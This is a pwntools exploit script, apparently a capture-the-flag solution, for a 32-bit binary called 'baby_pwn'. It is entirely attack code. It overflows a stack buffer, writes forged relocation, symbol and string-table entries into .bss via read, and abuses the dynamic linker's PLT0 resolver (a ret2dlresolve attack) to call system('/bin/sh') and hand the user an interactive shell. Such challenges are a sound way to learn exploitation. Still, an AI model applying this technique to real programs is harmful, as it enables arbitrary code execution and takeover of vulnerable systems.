from pwn import *

p = process('./baby_pwn')
elf = ELF('./baby_pwn')

bss = elf.bss()
readPLT = elf.plt['read']
vuln = elf.sym['vuln']
jmprel = 0x804833c
symtable = 0x80481dc
strtable = 0x804827c
plt0 = 0x8048380

fakerel = bss + 4*5 - jmprel
fakesymtable = bss + 4*11 - symtable
fakestr = 0x804a080 - strtable

payload = b'a'*44 + p32(readPLT) + p32(vuln) + p32(0) + p32(bss) + p32(0x100)
p.sendline(payload)

payload = b'/bin/sh\x00' + b'a'*12
payload += p32(bss + 8) + p32(fakesymtable * 0x10 + 7)
payload +=  b'a'*16 + p32(fakestr) + p32(0)*2 + p32(0x12) + b'a'*4
payload += b'system\x00'
p.sendline(payload)

payload = b'a'*44 + p32(plt0) + p32(fakerel) + b'aaaa' + p32(bss)
p.sendline(payload)

p.interactive()
